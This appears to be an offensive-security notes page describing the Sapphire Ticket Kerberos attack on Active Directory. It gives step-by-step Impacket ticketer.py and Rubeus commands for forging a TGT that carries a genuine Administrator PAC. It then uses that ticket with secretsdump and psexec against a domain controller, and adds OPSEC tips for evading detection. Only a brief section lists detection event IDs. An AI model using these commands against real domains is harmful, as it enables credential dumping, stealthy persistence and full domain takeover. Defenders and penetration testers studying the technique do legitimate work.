---
title: "Attack #14 — Sapphire Ticket Attack"
description: "The Sapphire Ticket is the most OPSEC-friendly ticket forging technique in the Kerberos attack family. It addresses the final detection gap that Diamond…"
category: active-directory
subcategory: "Kerberos & Delegation"
tags: ["active-directory", "kerberos", "credential-access", "privilege-escalation"]
tools: ["Impacket", "Mimikatz", "Rubeus", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #14 — Sapphire Ticket Attack.md"
---
# 🟠 Attack #14 — Sapphire Ticket Attack

***

## 📖 How It Works

The Sapphire Ticket is **the most OPSEC-friendly ticket forging technique** in the Kerberos attack family. It addresses the final detection gap that Diamond Tickets still have — fabricated PAC data. While Diamond Tickets modify a legitimate TGT's PAC with attacker-chosen group memberships (which can be detected by comparing PAC claims against actual AD group memberships), the Sapphire Ticket obtains a **real, legitimate PAC** belonging to the target high-privileged user via the **S4U2Self + User-to-User (U2U)** protocol extensions, then grafts that authentic PAC into a forged TGT.

### Ticket Evolution — From Golden to Sapphire

| Ticket Type | PAC Source | AS-REQ Present? | Detection Difficulty |
|---|---|---|---|
| **Golden** | Entirely fabricated | ❌ No | Easy — missing AS-REQ + fake PAC |
| **Silver** | Entirely fabricated | N/A (TGS only) | Medium — no DC events, but PAC validation catches it |
| **Diamond** | Modified from real (but groups changed) | ✅ Yes | Hard — has AS-REQ, but PAC groups mismatch AD |
| **Sapphire** | Real PAC obtained via S4U2Self+U2U | ✅ Yes | Very Hard — everything is legitimate |

### How It Works Step-by-Step

```
1. Obtain KRBTGT AES256 key (via DCSync)
2. Request a legitimate TGT for your controlled user (real AS-REQ)
3. Use S4U2Self + U2U to request a service ticket to yourself on behalf of
   the target privileged user (e.g., Administrator)
4. This returns a REAL PAC belonging to Administrator — with genuine group
   memberships signed by the DC
5. Extract the PAC from the S4U2Self response
6. Decrypt your TGT, replace YOUR PAC with Administrator's REAL PAC
7. Re-encrypt and re-sign the TGT
8. Result: Your TGT now carries Administrator's genuine PAC — undetectable
   by PAC inspection because the PAC data is 100% real
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **KRBTGT AES256 key** | Required for TGT decryption and re-encryption |
| **Domain Admin or DCSync rights** | To extract the KRBTGT key |
| **Valid domain user account** | For the initial AS-REQ and S4U2Self request |
| **Target user must exist** | The S4U2Self request queries the DC for the real PAC |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Impacket — ticketer.py** | Linux | `-impersonate` flag performs Sapphire Ticket attack |
| **Rubeus** | Windows | Can be used for the S4U2Self+U2U flow manually |
| **Mimikatz** | Windows | DCSync for KRBTGT key extraction |

***

## 💻 Full Commands

### 🔴 Impacket — ticketer.py (Linux — Primary Method)

```bash
# ── Sapphire Ticket — forge TGT with real Administrator PAC ───────────────────
ticketer.py -nthash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  low_user

# Flags:
# -nthash       = KRBTGT NT hash
# -impersonate  = Target user whose REAL PAC to obtain via S4U2Self+U2U
# -dc-ip        = DC to query for the S4U2Self request
# low_user      = Your controlled user for the base TGT

# ── Using AES key (preferred) ─────────────────────────────────────────────────
ticketer.py -aesKey b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  low_user

# ── Use the Sapphire Ticket ───────────────────────────────────────────────────
export KRB5CCNAME=low_user.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

### 🔴 Manual S4U2Self + U2U Flow (Rubeus — Windows)

```powershell
# ── Step 1: Request legitimate TGT ────────────────────────────────────────────
.\Rubeus.exe asktgt /user:low_user /password:Password1 /enctype:aes256 /nowrap /outfile:low_user.kirbi

# ── Step 2: Use S4U2Self+U2U to get Administrator's PAC ──────────────────────
.\Rubeus.exe s4u /self /user:low_user /impersonateuser:Administrator /ticket:low_user.kirbi /nowrap

# ── Step 3: Manual PAC extraction and TGT modification (requires custom tooling)
# The PAC from the S4U2Self response contains Administrator's real group memberships
# Graft this PAC into the original TGT using KRBTGT key

# Note: Rubeus does not have a single-command "sapphire" option like Diamond
# The Impacket ticketer.py with -impersonate is the cleanest approach
```

***

## 🎯 OPSEC Tips

- **Sapphire Ticket is virtually undetectable** — the PAC is real (signed by the DC), the AS-REQ is real, and the TGT encryption is correct
- **The S4U2Self+U2U request IS logged** — Event 4769 shows a service ticket request, but this is normal protocol behavior and hard to distinguish from legitimate traffic
- **AES encryption is mandatory** for maximum stealth
- **Sapphire > Diamond > Golden** — always prefer Sapphire when possible for the most OPSEC-safe persistence

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log (DC) | TGT request — present (legitimate AS-REQ) |
| **4769** | Security Log (DC) | S4U2Self service ticket request — watch for U2U patterns from non-service accounts |
| **4624** | Security Log | Logon with elevated privileges from unexpected user/host |

**Primary detection challenge:** Sapphire Tickets are the hardest to detect because every component is legitimate — the AS-REQ, the PAC data, and the encryption. Detection must focus on **behavioral analysis** — why is a low-privilege user suddenly accessing DA-protected resources? The S4U2Self+U2U request pattern from a non-service account is the only technical indicator, but it's subtle.

***

## 🔗 Attack Chain Context

```
[Sapphire Ticket] ──→ Most Stealthy Domain Persistence
         │
         ├──→ 🔑 Real PAC + Real AS-REQ = virtually undetectable
         ├──→ 🩸 Use as DA → DCSync → complete domain compromise
         ├──→ 🔒 Only defeated by KRBTGT reset × 2
         ├──→ 🔗 Chain: DCSync → get KRBTGT key → Sapphire Ticket
         └──→ 📊 OPSEC ranking: Sapphire > Diamond > Golden
```

***

> ✅ **Attack #14 — Sapphire Ticket complete.**
